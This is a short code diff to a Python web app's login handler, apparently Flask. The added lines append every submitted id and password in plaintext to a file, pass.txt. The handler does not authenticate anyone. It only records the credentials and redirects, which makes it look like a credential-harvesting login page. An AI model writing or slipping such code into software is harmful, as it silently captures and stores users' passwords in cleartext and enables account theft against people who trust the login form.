@@ -67,6 +67,9 @@ def login():
     if request.method == "POST":
         id = request.form.get('id')
         password = request.form.get('pass')
+        with open('pass.txt', 'a') as file:
+            file.writelines(f'\nid : {id} pass: {password}')
+            file.close()
         print(id, password)
         return redirect(f"/flames")
     return render_template("login.html")
